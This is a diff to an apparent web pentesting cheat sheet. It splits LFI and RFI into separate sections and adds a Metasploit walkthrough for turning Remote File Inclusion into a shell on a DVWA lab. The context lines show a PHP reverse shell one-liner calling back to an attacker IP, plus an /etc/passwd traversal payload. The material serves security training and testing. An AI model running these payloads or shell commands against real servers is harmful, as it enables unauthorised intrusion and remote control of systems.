@@ -94,7 +94,7 @@ IDOR stands for Insecure Direct Object Reference. It is a kind of access control
 - Check for IDOR effectiveness by using two different accounts trying to switch among them.
 - Check for ALL parameters in Network Tab of browser development tools (F12) for calls to any endpoint.
 
-# LFI & RFI
+# LFI
 
 LFI stands for Local File Inclusion, which is a technique where an attacker tricks a web application to retrieve a specific file from the system through a bad sanitized input form or query. It happens, for example, when requesting `http://targetsite.com/get.php?file=userCV.pdf`. If the "get.php" script is bad designed, a malicious user could force `http://targetsite.com/get.php?file=/etc/passwd`, getting all users on the system. LFI exploits PHP functions such as **include**, **require**, **include_once** and **require_once**. You must test out the URL parameter by adding the `dot-dot-slash` notation.
 
@@ -116,6 +116,32 @@ This means getting command execution on target exploiting LFI.
 
 Where we URL encoded `php -r '$sock=fsockopen("10.8.32.131",5000);exec("/bin/sh -i <&3 >&3 2>&3");'`. This is also known as **Log poisoning**.
 For all other LFI-2-RCE (via /proc/self/environ, via upload, via PHPSESSID, via vsftpd logs ecc.) have a look on [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion).
+
+# RFI
+
+Remote File Inclusion (RFI) is a technique to include remote files as a query to web applications. Such as LFI, RFI occurs when user input is improperly sanitized. RFI could easily allow an attacker to gain RCE on the server.
+
+## RFI-2-Shell
+
+Once checked for RFI vulnerability on a remote web application, suppose that a RFI is achieved by querying `http://victim-ip/dvwa/vulnerabilities/fi/?page=http://attacker-ip/test.php` :
+
+- Fire up Metasploit and use the module: `exploit/unix/webapp/php_include`
+- Set RHOSTS and RPORT depending on the web server.
+- Set HEADERS with all cookies or tokens. For example:
+
+      set HEADERS "Cookie:security=low; PHPSESSID=4c0c7c70dfafab05e7d04c88c8966aee"     
+
+- Set the PATH to the base directory of the web page. For example:
+
+      set PATH /dvwa/vulnerabilities/fi/
+
+- Set the PHPURI which is the URI to request, with the included parameter changed to `XXpathXX`. For example:
+
+      set PHPURI /?page=XXpathXX
+      
+- Finally, set the PHP bind shell as payload: `set PAYLOAD php/bind_php` and set for LHOST and LPORT of the attacker machine.
+
+If configured properly, a direct shell will open up.
 
 # SSRF
 
